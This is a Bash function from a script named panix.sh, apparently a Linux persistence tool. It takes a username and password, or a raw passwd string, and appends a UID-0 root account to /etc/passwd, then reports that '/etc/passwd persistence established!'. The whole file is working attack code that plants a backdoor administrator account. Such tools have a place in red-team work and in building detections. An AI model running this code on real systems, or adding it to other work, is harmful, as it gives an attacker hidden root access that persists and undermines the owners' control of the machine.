setup_passwd_user() {
	local default=0
	local custom=0
	local username=""
	local password=""
	local passwd_string=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_passwd_user() {
		echo "Usage: ./panix.sh --passwd-user [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default settings"
		echo "  --username <username>        Specify the username"
		echo "  --password <password>        Specify the password"
		echo "--custom                     Use custom string"
		echo "  --passwd-string <string>     Specify the /etc/passwd string"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--username )
				shift
				username=$1
				;;
			--password )
				shift
				password=$1
				;;
			--passwd-string )
				shift
				passwd_string=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --passwd-user --default --username <username> --password <password>"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --passwd-user --custom --passwd-string <openssl generated passwd string>"
				exit 0
				;;
			--help|-h)
				usage_passwd_user
				exit 0
				;;
		
			* )
				echo "Invalid option for --passwd-user: $1"
				echo "Try './panix.sh --passwd-user --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --passwd-user --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		if [[ -z $username || -z $password ]]; then
			echo "Error: --username and --password must be specified with --default."
			echo "Try './panix.sh --passwd-user --help' for more information."
			exit 1
		fi

		if ! command -v openssl &> /dev/null; then
			echo "Error: openssl is not installed on this system. Use --custom with --passwd-string instead."
			exit 1
		fi

		openssl_password=$(openssl passwd "$password")
		if [[ $? -eq 0 ]]; then
			echo "$username:$openssl_password:0:0:root:/root:/bin/bash" >> /etc/passwd
			echo "[+] User $username added to /etc/passwd with root privileges."
		else
			echo "[-] Failed to generate password hash with openssl."
			exit 1
		fi

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $passwd_string ]]; then
			echo "Error: --passwd-string must be specified with --custom."
			echo "Try './panix.sh --passwd-user --help' for more information."
			exit 1
		fi

		echo "$passwd_string" >> /etc/passwd
		echo "[+] Custom passwd string added to /etc/passwd."
	else
		echo "Error: Either --default or --custom must be specified for --passwd-user."
		echo "Try './panix.sh --passwd-user --help' for more information."
		exit 1
	fi
	echo "[+] /etc/passwd persistence established!"
}
